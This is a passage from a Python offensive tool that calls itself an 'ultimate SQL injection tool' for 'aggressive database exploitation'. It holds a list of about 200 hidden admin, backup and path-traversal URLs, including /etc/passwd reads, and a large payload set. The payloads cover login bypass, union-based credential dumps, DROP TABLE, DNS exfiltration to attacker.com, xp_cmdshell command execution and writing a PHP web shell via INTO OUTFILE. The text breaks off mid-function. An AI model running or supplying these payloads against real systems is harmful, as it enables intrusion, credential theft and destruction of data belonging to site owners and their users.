#!/usr/bin/env python3
"""
ULTIMATE SQL INJECTION TOOL - MODERN VERSION
Aggressive database exploitation through URL parameters only
"""

import requests
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

class UltimateSQLInjector:
    def __init__(self, target_url):
        self.target_url = target_url
        self.vulnerable_params = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        # 200+ Hidden Login Paths
        self.hidden_paths = [
            # Admin Panels
            '/admin', '/admin/', '/admin/login', '/admin/login/', '/admin/admin', 
            '/administrator', '/administrator/', '/admin_area', '/adminarea',
            '/adminpanel', '/admincp', '/moderator', '/staff', '/backend',
            '/secure', '/secret', '/private', '/hidden', '/login/admin',
            
            # CMS Specific
            '/wp-admin', '/wp-login.php', '/wordpress/wp-admin', '/wordpress/wp-login.php',
            '/joomla/administrator', '/drupal/user', '/drupal/user/login',
            '/magento/admin', '/opencart/admin', '/prestashop/admin',
            '/phpmyadmin', '/phpMyAdmin', '/pma', '/myadmin', '/mysql',
            
            # Common Backdoors
            '/config', '/configuration', '/setup', '/install', '/update',
            '/upgrade', '/backup', '/backups', '/old', '/new', '/test',
            
            # API & Services
            '/api', '/api/admin', '/api/login', '/graphql', '/graphql/admin',
            '/rest', '/rest/admin', '/v1', '/v1/admin', '/v2', '/v2/admin',
            
            # File Extensions
            '/admin.php', '/admin.asp', '/admin.aspx', '/admin.jsp',
            '/admin.cgi', '/admin.pl', '/admin.py', '/admin.rb',
            '/login.php', '/login.asp', '/login.aspx', '/login.jsp',
            
            # Variations
            '/admin1', '/admin2', '/admin3', '/admin4', '/admin5',
            '/admin_test', '/admin_dev', '/admin_prod', '/admin_live',
            '/admin_old', '/admin_new', '/admin_2023', '/admin_2024',
            
            # Subdomains (for reconstruction)
            'http://admin.example.com', 'http://admin1.example.com',
            'http://administrator.example.com', 'http://backend.example.com',
            'http://controlpanel.example.com', 'http://cpanel.example.com',
            'http://dashboard.example.com', 'http://dev.example.com',
            'http://development.example.com', 'http://intranet.example.com',
            'http://internal.example.com', 'http://manage.example.com',
            'http://management.example.com', 'http://portal.example.com',
            'http://private.example.com', 'http://secure.example.com',
            'http://staff.example.com', 'http://system.example.com',
            'http://webadmin.example.com', 'http://webmaster.example.com',
            
            # Directory Traversal
            '/.admin', '/.admin/', '/_admin', '/_admin/', '/~admin',
            '/%2e%2e%2fadmin', '/..;/admin', '/..;/admin/',
            
            # Common Files
            '/admin/config.php', '/admin/settings.php', '/admin/config.inc.php',
            '/admin/configuration.php', '/admin/setup.php', '/admin/install.php',
            '/admin/update.php', '/admin/upgrade.php', '/admin/backup.php',
            '/admin/backup.sql', '/admin/database.php', '/admin/db.php',
            
            # Database Files
            '/admin/db.sql', '/admin/database.sql', '/admin/backup.sql',
            '/admin/dump.sql', '/admin/export.sql', '/admin/import.sql',
            
            # Backup Files
            '/admin/backup.zip', '/admin/backup.tar', '/admin/backup.tar.gz',
            '/admin/backup.rar', '/admin/backup.7z', '/admin/backup.bak',
            '/admin/backup.tgz', '/admin/backup.bz2',
            
            # Configuration Files
            '/admin/config.ini', '/admin/config.yml', '/admin/config.yaml',
            '/admin/config.json', '/admin/config.xml', '/admin/config.cfg',
            '/admin/settings.ini', '/admin/settings.yml', '/admin/settings.yaml',
            '/admin/settings.json', '/admin/settings.xml', '/admin/settings.cfg',
            
            # Log Files
            '/admin/access.log', '/admin/error.log', '/admin/security.log',
            '/admin/debug.log', '/admin/system.log', '/admin/app.log',
            
            # Development Files
            '/admin/.env', '/admin/.env.local', '/admin/.env.production',
            '/admin/.env.development', '/admin/.env.test', '/admin/.env.staging',
            '/admin/.git', '/admin/.git/', '/admin/.git/config',
            '/admin/.svn', '/admin/.svn/', '/admin/.hg', '/admin/.hg/',
            '/admin/.bzr', '/admin/.bzr/', '/admin/CVS', '/admin/CVS/',
            
            # Test Files
            '/admin/test.php', '/admin/test.html', '/admin/test.txt',
            '/admin/test.cgi', '/admin/test.pl', '/admin/test.py',
            '/admin/test.rb', '/admin/test.jsp', '/admin/test.asp',
            
            # Documentation
            '/admin/readme.txt', '/admin/readme.md', '/admin/README',
            '/admin/LICENSE', '/admin/CHANGELOG', '/admin/CHANGELOG.md',
            '/admin/CHANGES', '/admin/NEWS', '/admin/TODO', '/admin/FAQ',
            
            # Temporary Files
            '/admin/tmp', '/admin/tmp/', '/admin/temp', '/admin/temp/',
            '/admin/cache', '/admin/cache/', '/admin/sessions', '/admin/sessions/',
            
            # Upload Directories
            '/admin/uploads', '/admin/uploads/', '/admin/files', '/admin/files/',
            '/admin/images', '/admin/images/', '/admin/media', '/admin/media/',
            '/admin/assets', '/admin/assets/', '/admin/static', '/admin/static/',
            
            # Source Code
            '/admin/src', '/admin/src/', '/admin/source', '/admin/source/',
            '/admin/lib', '/admin/lib/', '/admin/libs', '/admin/libs/',
            '/admin/include', '/admin/include/', '/admin/includes', '/admin/includes/',
            '/admin/inc', '/admin/inc/', '/admin/classes', '/admin/classes/',
            '/admin/class', '/admin/class/', '/admin/models', '/admin/models/',
            '/admin/views', '/admin/views/', '/admin/controllers', '/admin/controllers/',
            
            # Vendor Directories
            '/admin/vendor', '/admin/vendor/', '/admin/composer', '/admin/composer/',
            '/admin/node_modules', '/admin/node_modules/', '/admin/bower_components', '/admin/bower_components/',
            
            # Framework Specific
            '/admin/app', '/admin/app/', '/admin/public', '/admin/public/',
            '/admin/web', '/admin/web/', '/admin/var', '/admin/var/',
            '/admin/storage', '/admin/storage/', '/admin/runtime', '/admin/runtime/',
            
            # Database Directories
            '/admin/db', '/admin/db/', '/admin/database', '/admin/database/',
            '/admin/sql', '/admin/sql/', '/admin/data', '/admin/data/',
            '/admin/sqlite', '/admin/sqlite/', '/admin/mysql', '/admin/mysql/',
            '/admin/postgresql', '/admin/postgresql/', '/admin/mongodb', '/admin/mongodb/',
            
            # System Directories
            '/admin/system', '/admin/system/', '/admin/bin', '/admin/bin/',
            '/admin/sbin', '/admin/sbin/', '/admin/usr', '/admin/usr/',
            '/admin/etc', '/admin/etc/', '/admin/var', '/admin/var/',
            '/admin/opt', '/admin/opt/', '/admin/home', '/admin/home/',
            
            # User Directories
            '/admin/users', '/admin/users/', '/admin/members', '/admin/members/',
            '/admin/accounts', '/admin/accounts/', '/admin/profiles', '/admin/profiles/',
            '/admin/customers', '/admin/customers/', '/admin/clients', '/admin/clients/',
            
            # Content Management
            '/admin/content', '/admin/content/', '/admin/articles', '/admin/articles/',
            '/admin/posts', '/admin/posts/', '/admin/pages', '/admin/pages/',
            '/admin/blogs', '/admin/blogs/', '/admin/news', '/admin/news/',
            '/admin/events', '/admin/events/', '/admin/products', '/admin/products/',
            '/admin/store', '/admin/store/', '/admin/shop', '/admin/shop/',
            '/admin/cart', '/admin/cart/', '/admin/orders', '/admin/orders/',
            
            # Support Directories
            '/admin/support', '/admin/support/', '/admin/help', '/admin/help/',
            '/admin/faq', '/admin/faq/', '/admin/knowledgebase', '/admin/knowledgebase/',
            '/admin/wiki', '/admin/wiki/', '/admin/documentation', '/admin/documentation/',
            
            # Communication
            '/admin/chat', '/admin/chat/', '/admin/messages', '/admin/messages/',
            '/admin/email', '/admin/email/', '/admin/contact', '/admin/contact/',
            '/admin/forum', '/admin/forum/', '/admin/forums', '/admin/forums/',
            '/admin/board', '/admin/board/', '/admin/boards', '/admin/boards/',
            
            # Security
            '/admin/security', '/admin/security/', '/admin/firewall', '/admin/firewall/',
            '/admin/antivirus', '/admin/antivirus/', '/admin/malware', '/admin/malware/',
            '/admin/virus', '/admin/virus/', '/admin/scan', '/admin/scan/',
            
            # Monitoring
            '/admin/monitor', '/admin/monitor/', '/admin/logs', '/admin/logs/',
            '/admin/analytics', '/admin/analytics/', '/admin/stats', '/admin/stats/',
            '/admin/statistics', '/admin/statistics/', '/admin/reports', '/admin/reports/',
            
            # Backup Directories
            '/admin/backups', '/admin/backups/', '/admin/archive', '/admin/archive/',
            '/admin/history', '/admin/history/', '/admin/oldfiles', '/admin/oldfiles/',
            
            # Development Tools
            '/admin/phpinfo.php', '/admin/info.php', '/admin/test.php',
            '/admin/debug.php', '/admin/console.php', '/admin/shell.php',
            '/admin/terminal.php', '/admin/command.php', '/admin/exec.php',
            
            # Web Services
            '/admin/wsdl', '/admin/wsdl/', '/admin/soap', '/admin/soap/',
            '/admin/rest', '/admin/rest/', '/admin/api', '/admin/api/',
            '/admin/json', '/admin/json/', '/admin/xml', '/admin/xml/',
            
            # Search Directories
            '/admin/search', '/admin/search/', '/admin/find', '/admin/find/',
            '/admin/lookup', '/admin/lookup/', '/admin/query', '/admin/query/',
            
            # Export/Import
            '/admin/export', '/admin/export/', '/admin/import', '/admin/import/',
            '/admin/download', '/admin/download/', '/admin/upload', '/admin/upload/',
            
            # Email Directories
            '/admin/email', '/admin/email/', '/admin/mail', '/admin/mail/',
            '/admin/smtp', '/admin/smtp/', '/admin/imap', '/admin/imap/',
            '/admin/pop3', '/admin/pop3/',
            
            # Authentication
            '/admin/auth', '/admin/auth/', '/admin/authentication', '/admin/authentication/',
            '/admin/login', '/admin/login/', '/admin/logout', '/admin/logout/',
            '/admin/signin', '/admin/signin/', '/admin/signout', '/admin/signout/',
            '/admin/register', '/admin/register/', '/admin/signup', '/admin/signup/',
            
            # Session Management
            '/admin/session', '/admin/session/', '/admin/sessions', '/admin/sessions/',
            '/admin/cookie', '/admin/cookie/', '/admin/cookies', '/admin/cookies/',
            '/admin/token', '/admin/token/', '/admin/tokens', '/admin/tokens/',
            
            # Payment Processing
            '/admin/payment', '/admin/payment/', '/admin/payments', '/admin/payments/',
            '/admin/billing', '/admin/billing/', '/admin/invoice', '/admin/invoice/',
            '/admin/invoices', '/admin/invoices/',
            
            # Shipping
            '/admin/shipping', '/admin/shipping/', '/admin/delivery', '/admin/delivery/',
            '/admin/transport', '/admin/transport/', '/admin/logistics', '/admin/logistics/',
            
            # Inventory
            '/admin/inventory', '/admin/inventory/', '/admin/stock', '/admin/stock/',
            '/admin/warehouse', '/admin/warehouse/', '/admin/supply', '/admin/supply/',
            
            # Human Resources
            '/admin/hr', '/admin/hr/', '/admin/humanresources', '/admin/humanresources/',
            '/admin/employees', '/admin/employees/', '/admin/staff', '/admin/staff/',
            '/admin/personnel', '/admin/personnel/',
            
            # Accounting
            '/admin/accounting', '/admin/accounting/', '/admin/finance', '/admin/finance/',
            '/admin/accounts', '/admin/accounts/', '/admin/budget', '/admin/budget/',
            '/admin/expenses', '/admin/expenses/',
            
            # Marketing
            '/admin/marketing', '/admin/marketing/', '/admin/advertising', '/admin/advertising/',
            '/admin/promotion', '/admin/promotion/', '/admin/campaign', '/admin/campaign/',
            '/admin/seo', '/admin/seo/',
            
            # Customer Relations
            '/admin/crm', '/admin/crm/', '/admin/customer', '/admin/customer/',
            '/admin/client', '/admin/client/', '/admin/partner', '/admin/partner/',
            '/admin/vendor', '/admin/vendor/',
            
            # Project Management
            '/admin/project', '/admin/project/', '/admin/projects', '/admin/projects/',
            '/admin/task', '/admin/task/', '/admin/tasks', '/admin/tasks/',
            '/admin/todo', '/admin/todo/',
            
            # Calendar
            '/admin/calendar', '/admin/calendar/', '/admin/schedule', '/admin/schedule/',
            '/admin/event', '/admin/event/', '/admin/events', '/admin/events/',
            
            # File Management
            '/admin/filemanager', '/admin/filemanager/', '/admin/files', '/admin/files/',
            '/admin/documents', '/admin/documents/', '/admin/images', '/admin/images/',
            '/admin/media', '/admin/media/',
            
            # System Administration
            '/admin/system', '/admin/system/', '/admin/server', '/admin/server/',
            '/admin/hosting', '/admin/hosting/', '/admin/domain', '/admin/domain/',
            '/admin/dns', '/admin/dns/',
            
            # Network
            '/admin/network', '/admin/network/', '/admin/networking', '/admin/networking/',
            '/admin/firewall', '/admin/firewall/', '/admin/router', '/admin/router/',
            '/admin/switch', '/admin/switch/',
            
            # Development
            '/admin/dev', '/admin/dev/', '/admin/development', '/admin/development/',
            '/admin/staging', '/admin/staging/', '/admin/testing', '/admin/testing/',
            '/admin/qa', '/admin/qa/',
            
            # Production
            '/admin/prod', '/admin/prod/', '/admin/production', '/admin/production/',
            '/admin/live', '/admin/live/', '/admin/real', '/admin/real/',
            
            # Last 50 ultra-hidden paths
            '/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            '/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd',
            '/..%252f..%252f..%252fetc%252fpasswd',
            '/..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            '/..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd',
            '/..\\..\\..\\windows\\win.ini',
            '/..%255c..%255c..%255cwindows%255cwin.ini',
            '/#/../../../../etc/passwd',
            '/?file=../../../../etc/passwd',
            '/;file=../../../../etc/passwd'
        ]
        
        # 200+ SQL Injection Payloads
        self.payloads = [
            # Basic Authentication Bypass
            "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#", "' OR '1'='1'/*",
            "admin'--", "admin'#", "admin'/*", "' OR 1=1--", "' OR 1=1#",
            "' OR 1=1/*", "') OR '1'='1--", "') OR ('1'='1--",
            
            # Union Based Payloads
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT 1--",
            "' UNION SELECT 1,2--", "' UNION SELECT 1,2,3--",
            "' UNION SELECT @@version--", "' UNION SELECT user()--",
            "' UNION SELECT database()--", "' UNION SELECT version()--",
            "' UNION SELECT current_user()--", "' UNION SELECT schema_name FROM information_schema.schemata--",
            
            # Error Based Payloads
            "' AND EXTRACTVALUE(0,CONCAT(0x3a,@@version))--",
            "' AND UPDATEXML(0,CONCAT(0x3a,@@version),0)--",
            "' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a)--",
            "' OR GTID_SUBSET(@@version,0)--", "' AND ST_GeomFromText(CONCAT('POINT(',@@version,')'))--",
            
            # Blind Boolean Payloads
            "' AND ASCII(SUBSTRING((SELECT database()),1,1))>97--",
            "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='a'--",
            "' AND (SELECT LENGTH(table_name) FROM information_schema.tables LIMIT 1)>5--",
            "' AND (SELECT ASCII(SUBSTRING(column_name,1,1)) FROM information_schema.columns LIMIT 1)>97--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            
            # Time-Based Blind Payloads
            "' AND SLEEP(5)--", "' AND IF(ASCII(SUBSTRING(database(),1,1))>97,SLEEP(5),0)--",
            "' OR SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--",
            "'; WAITFOR DELAY '00:00:05' AND '1'='1", "'; WAITFOR DELAY '00:00:05' OR '1'='1",
            "' AND pg_sleep(5)--", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND BENCHMARK(1000000,MD5('test'))--", "' OR BENCHMARK(1000000,MD5('test'))--",
            
            # Stacked Queries
            "'; DROP TABLE users--", "'; UPDATE users SET password='hacked' WHERE username='admin'--",
            "'; INSERT INTO users(username,password) VALUES('hacker','pwned')--",
            "'; CREATE TABLE hacked (data TEXT); INSERT INTO hacked VALUES('pwned')--",
            "'; ALTER TABLE users ADD COLUMN hacked TEXT--",
            
            # Out-of-Band
            "' UNION SELECT LOAD_FILE('\\\\\\\\attacker\\\\share\\\\test.txt')--",
            "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT database()),'.attacker.com\\\\test.txt')))--",
            "' UNION SELECT NULL,@@version INTO OUTFILE '/tmp/test.txt'--",
            
            # PostgreSQL Specific
            "'::VARCHAR(5)", "' AND 1::int=1--", "' UNION SELECT NULL,current_database()--",
            "' AND (SELECT pg_sleep(5))--", "' AND (SELECT current_setting('server_version')) LIKE '%%'--",
            
            # MySQL Specific
            "' AND 1=1#", "' AND 1=1-- -", "' UNION SELECT NULL,@@version#",
            "' AND SLEEP(5)#", "' INTO OUTFILE '/tmp/test.txt'--",
            "' INTO DUMPFILE '/tmp/test.txt'--", "' AND (SELECT @@global.secure_file_priv)=''--",
            
            # MSSQL Specific
            "'; EXEC xp_cmdshell('dir')--", "' AND 1=CONVERT(int,@@version)--",
            "' UNION SELECT NULL,@@version--", "'; WAITFOR DELAY '0:0:5'--",
            "' AND (SELECT @@servername) LIKE '%%'--", "' ;EXEC sp_configure 'show advanced options',1;RECONFIGURE--",
            
            # Oracle Specific
            "' AND 1=to_char(1)--", "' UNION SELECT NULL,NULL FROM dual--",
            "' AND (SELECT * FROM (SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),5) FROM dual))--",
            "' AND (SELECT banner FROM v\\$version WHERE rownum=1) LIKE '%%'--",
            
            # SQLite Specific
            "' AND 1=1--", "' UNION SELECT NULL,sqlite_version()--",
            "' AND (SELECT sql FROM sqlite_master) LIKE '%%'--",
            
            # NoSQL/JSON Injection
            "' || '1'=='1", "{\\\"\$ne\\\": null}", "'; return true; var x='",
            "{\\\"username\\\": {\\\"\\\$ne\\\": null}, \\\"password\\\": {\\\"\\\$ne\\\": null}}",
            
            # WAF Bypass Payloads
            "' /*!50000OR*/ '1'='1", "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--",
            "'%0AUNION%0ASELECT%0ANULL,NULL--", "'%09UNION%09SELECT%09NULL--",
            "'%0DUNION%0DSELECT%0DNULL--", "'/**/UNION/**/SELECT/**/NULL--",
            "'\\tUNION\\tSELECT\\tNULL--", "'\\nUNION\\nSELECT\\nNULL--",
            "'\\rUNION\\rSELECT\\rNULL--", "'/*!UNION*//*!SELECT*/NULL--",
            
            # Comment Bypass
            "'/**/OR/**/'1'/**/='1", "'--%0AOR 1=1", "'#%0AOR 1=1",
            "'/*comment*/OR/*comment*/1=1", "'/**_**/OR/**_**/1=1",
            
            # URL Encoding Bypass
            "%27%20OR%201%3D1", "%2527%2520OR%25201%253D1",
            "%u0027%u0020OR%u00201%u003D1", "'%EF%BC%87OR%EF%BC%871%EF%BC%9D1",
            
            # Double Encoding
            "%25%32%37%25%32%30%4f%52%25%32%30%31%25%33%44%31",
            "'%2520OR%25201%253D1", "'%255COR%255C1%255C%253D1",
            
            # Unicode Bypass
            "'%u02b9OR%u02b91%u0e3D1", "'%uff07OR%uff071%uff1d1",
            "'%c0%a7OR%c0%a71%c0%bd1", "'%e0%80%a7OR%e0%80%a71%e0%80%bd1",
            
            # Case Manipulation
            "' Or '1'='1", "' oR '1'='1", "' OR '1'='1",
            "'Or'1'='1", "'oR'1'='1", "'OR'1'='1",
            
            # Keyword Splitting
            "' O'+'R '1'='1", "' OR'1'='1", "'OR'1'='1",
            "' UN'+'ION SE'+'LECT NULL--", "' SEL'+'ECT @@version--",
            
            # Concatenation
            "' OR '1'='1'+'1", "' OR '1'='1'||'1",
            "' OR CONCAT('1','1')='11", "' OR '1'='1' AND '1'='1",
            
            # Advanced Boolean
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
            "' AND (SELECT LENGTH(CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS CHAR))) > 0--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND (SELECT @a:=MID(@@version,1,1))='5'--",
            
            # Heavy Payloads (Long/Complex)
            "' AND 1=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
            "' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",
            "' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e--",
            
            # File Operations
            "' UNION SELECT NULL,LOAD_FILE('/etc/passwd')--",
            "' UNION SELECT NULL,LOAD_FILE('C:/Windows/win.ini')--",
            "' UNION SELECT NULL,LOAD_FILE('/etc/shadow')--",
            "' UNION SELECT NULL,LOAD_FILE('C:/boot.ini')--",
            
            # DNS Exfiltration
            "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT HEX(SUBSTRING(table_name,1,10))),'.attacker.com\\\\test.txt')))--",
            "' UNION SELECT NULL,MAKE_SET(6,@\\@version)--",
            
            # Command Execution (MSSQL)
            "'; EXEC master..xp_cmdshell 'ping attacker.com'--",
            "' UNION SELECT NULL,NULL,NULL,NULL; EXEC xp_cmdshell 'dir C:'--",
            "'; EXEC xp_cmdshell 'net user'--", "'; EXEC xp_cmdshell 'whoami'--",
            
            # Command Execution (MySQL)
            "' AND (SELECT sys_exec('whoami'))--",
            "' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F7068702073797374656D28245F4745545B22636D64225D293B203F3E--",
            
            # Command Execution (PostgreSQL)
            "'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'whoami';--",
            "' UNION SELECT NULL,(SELECT cmd_output FROM cmd_exec LIMIT 1)--",
            
            # Privilege Escalation
            "' UNION SELECT NULL,grantee FROM information_schema.user_privileges--",
            "' AND (SELECT super_priv FROM mysql.user WHERE user='root' LIMIT 1)='Y'--",
            
            # Database Enumeration
            "' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=database()--",
            "' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--",
            "' UNION SELECT NULL,CONCAT(table_name,':',column_name) FROM information_schema.columns--",
            
            # Data Exfiltration
            "' UNION SELECT NULL,CONCAT(username,':',password) FROM users--",
            "' UNION SELECT NULL,CONCAT(email,':',password) FROM users--",
            "' UNION SELECT NULL,GROUP_CONCAT(username,':',password) FROM users--",
            "' UNION SELECT NULL,GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_name='users'--",
            
            # Binary Data
            "' UNION SELECT NULL,HEX(password) FROM users--",
            "' UNION SELECT NULL,TO_BASE64(password) FROM users--",
            "' UNION SELECT NULL,MD5(password) FROM users--",
            "' UNION SELECT NULL,SHA1(password) FROM users--",
            
            # Conditional Responses
            "' AND IF(1=1,(SELECT 1 UNION SELECT 2),0)--",
            "' OR IFNULL(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)),0)>0--",
            "' AND CASE WHEN 1=1 THEN 1 ELSE 0 END=1--",
            
            # Subquery Exploitation
            "' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>0)--",
            "' AND EXISTS(SELECT * FROM users WHERE username LIKE '%admin%')--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            
            # Time Delays with Conditions
            "' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>50,SLEEP(5),0)--",
            "' OR (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>50) THEN SLEEP(5) ELSE 0 END)--",
            
            # Heavy Time-Based
            "' AND (SELECT * FROM (SELECT(BENCHMARK(1000000,MD5('test'))))a)--",
            "' OR RLIKE SLEEP(5)", "' AND (SELECT 1 FROM (SELECT SLEEP(5))a WHERE 1=1)--",
            
            # Blind Extraction Payloads
            "' AND ASCII(SUBSTRING((SELECT @@version),1,1))=53--",
            "' AND (SELECT ORD(MID((SELECT IFNULL(CAST(user() AS CHAR),0x20)),1,1))>96)--",
            "' AND (SELECT ASCII(SUBSTRING((SELECT password FROM users LIMIT 1 OFFSET 0),1,1))) BETWEEN 48 AND 57--",
            
            # Order By Injection
            "' ORDER BY 1--", "' ORDER BY 2--", "' ORDER BY 3--",
            "' ORDER BY (SELECT 1)--", "' ORDER BY (SELECT @@version)--",
            
            # Group By Injection
            "' GROUP BY 1--", "' GROUP BY 2--", "' GROUP BY column_name--",
            
            # Having Clause Injection
            "' HAVING 1=1--", "' HAVING (SELECT @@version) LIKE '%'--",
            
            # Limit Clause Injection
            "' LIMIT 0,1 UNION SELECT @@version--",
            "' LIMIT 1 OFFSET 0 UNION SELECT 1,2--",
            
            # Procedure Analysis
            "' AND (SELECT COUNT(*) FROM information_schema.routines)>0--",
            "' UNION SELECT NULL,routine_name FROM information_schema.routines--",
            
            # Trigger Injection
            "' AND (SELECT COUNT(*) FROM information_schema.triggers)>0--",
            "' UNION SELECT NULL,trigger_name FROM information_schema.triggers--",
            
            # View Injection
            "' AND (SELECT COUNT(*) FROM information_schema.views)>0--",
            "' UNION SELECT NULL,table_name FROM information_schema.views--",
            
            # Schema Enumeration
            "' UNION SELECT NULL,schema_name FROM information_schema.schemata--",
            "' AND (SELECT COUNT(DISTINCT table_schema) FROM information_schema.tables)>0--",
            
            # Character Set Bypass
            "' COLLATE utf8_general_ci OR '1'='1",
            "' AND '1'='1' COLLATE latin1_general_ci--",
            
            # Mathematical Operations
            "' OR 1-1=0--", "' OR 2*2=4--", "' OR 8/2=4--",
            "' OR 2+2=4--", "' OR 2^2=4--", "' OR MOD(4,2)=0--",
            
            # Bitwise Operations
            "' OR 1|1=1--", "' OR 1&1=1--", "' OR 1^0=1--",
            "' OR ~0=-1--", "' OR 1<<1=2--", "' OR 4>>1=2--",
            
            # String Functions
            "' OR CONCAT('1','1')='11'--", "' OR SUBSTRING('test',1,1)='t'--",
            "' OR CHAR(65)='A'--", "' OR ASCII('A')=65--",
            "' OR LENGTH('test')=4--", "' OR REVERSE('test')='tset'--",
            
            # Date/Time Functions
            "' OR NOW()=NOW()--", "' OR CURDATE()=CURDATE()--",
            "' OR UNIX_TIMESTAMP()>0--", "' OR DATE_ADD(NOW(), INTERVAL 1 DAY)>NOW()--",
            
            # Type Conversion
            "' OR CAST('1' AS SIGNED)=1--", "' OR CONVERT('1', SIGNED)=1--",
            "' OR '1'+0=1--", "' OR '1'*1=1--",
            
            # Null Injection
            "' OR NULL IS NULL--", "' OR 1 IS NOT NULL--",
            "' OR COALESCE(NULL,1)=1--", "' OR IFNULL(NULL,1)=1--",
            
            # JSON Injection (Modern DBs)
            "' OR JSON_EXTRACT('{\"a\":1}', '$.a')=1--",
            "' OR JSON_CONTAINS('{\"a\":1}', '1', '$.a')--",
            
            # XML Injection
            "' OR ExtractValue('<a>test</a>', '/a')='test'--",
            "' OR UpdateXML('<a>test</a>', '/a', '<a>hacked</a>')--",
            
            # Full-Text Search
            "' OR MATCH(column) AGAINST('test')--",
            "' OR MATCH(column) AGAINST('test' IN BOOLEAN MODE)--",
            
            # Spatial Data
            "' OR ST_Contains(ST_GeomFromText('POLYGON((0 0,10 0,10 10,0 10,0 0))'), ST_GeomFromText('POINT(5 5)'))--",
            
            # Window Functions
            "' OR ROW_NUMBER() OVER (ORDER BY 1)=1--",
            "' OR RANK() OVER (ORDER BY 1)=1--",
            
            # Recursive CTE
            "') OR 1=1 WITH RECURSIVE cte AS (SELECT 1 n UNION ALL SELECT n+1 FROM cte WHERE n<10) SELECT * FROM cte--",
            
            # Bulk Operations
            "' OR (SELECT COUNT(*) FROM (SELECT 1 UNION ALL SELECT 2 UNION ALL SELECT 3) a)=3--",
            
            # Pivot Operations
            "' OR (SELECT MAX(CASE WHEN 1=1 THEN 1 END))=1--",
            
            # Dynamic SQL
            "'; EXECUTE IMMEDIATE 'SELECT 1 FROM dual';--",
            "'; PREPARE stmt FROM 'SELECT ?'; EXECUTE stmt USING 1;--",
            
            # Last Resort Payloads
            "' OR (SELECT 1 FROM DUAL WHERE 1=1 AND (SELECT * FROM (SELECT(SLEEP(10)))a))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT (@a) FROM (SELECT(@a:=0x00),(SELECT (@a) FROM (information_schema.columns) WHERE (@a)IN (@a:=CONCAT(@a,table_name,0x3a,column_name,0x3a))))a),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
        ]
        
        # SQLMap style table extraction payloads
        self.extraction_payloads = {
            'version': [
                "' UNION SELECT @@version,NULL--",
                "' UNION SELECT version(),NULL--",
                "' AND 1=CONVERT(int,@@version)--"
            ],
            'user': [
                "' UNION SELECT user(),NULL--",
                "' UNION SELECT current_user,NULL--",
                "' UNION SELECT session_user,NULL--"
            ],
            'database': [
                "' UNION SELECT database(),NULL--",
                "' UNION SELECT schema_name,NULL FROM information_schema.schemata--",
                "' UNION SELECT DB_NAME(),NULL--"
            ],
            'tables': [
                "' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--",
                "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1--"
            ],
            'columns': [
                "' UNION SELECT group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'--",
                "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' LIMIT 0,1--"
            ],
            'dump_users': [
                "' UNION SELECT group_concat(username),NULL FROM users--",
                "' UNION SELECT group_concat(password),NULL FROM users--",
                "' UNION SELECT group_concat(email),NULL FROM users--",
                "' UNION SELECT CONCAT(username,':',password,':',email),NULL FROM users--"
            ]
        }

    def option1_find_hidden_login(self):
        """Option 1: Find hidden login pages (200+ paths)"""
        print(f"\n[+] Scanning for hidden login pages on {self.target_url}")
        print(f"[+] Testing {len(self.hidden_paths)} paths...\n")
        
        found = []
        base_url = self.target_url.split('?')[0].rstrip('/')
        
        def check_path(path):
